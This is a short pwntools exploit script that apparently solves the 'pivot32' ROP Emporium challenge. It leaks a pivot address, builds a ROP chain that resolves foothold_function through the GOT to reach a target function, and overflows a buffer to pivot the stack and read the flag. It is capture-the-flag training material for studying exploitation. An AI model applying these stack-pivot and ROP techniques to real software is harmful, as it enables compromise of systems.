#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./pivot32")

shell.recvuntil(b"pivot: ")
pivot = int(shell.recvline().strip(), 16)

offset = 44
junk = b"A" * offset

payload  = b""
payload += p32(0x8048520) # foothold_function@plt
payload += p32(0x804882c) # pop eax; ret;
payload += p32(0x804a024) # foothold_function@got
payload += p32(0x8048830) # mov eax, dword ptr [eax]; ret;
payload += p32(0x80484a9) # pop ebx; ret;
payload += p32(0x1f7)     # offset
payload += p32(0x8048833) # add eax, ebx; ret;
payload += p32(0x80485f0) # call eax;

shell.sendlineafter(b"> ", payload)

payload  = b""
payload += junk
payload += p32(0x804882c) # pop eax; ret;
payload += p32(pivot)     # pivot addr
payload += p32(0x804882e) # xchg esp, eax; ret;

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
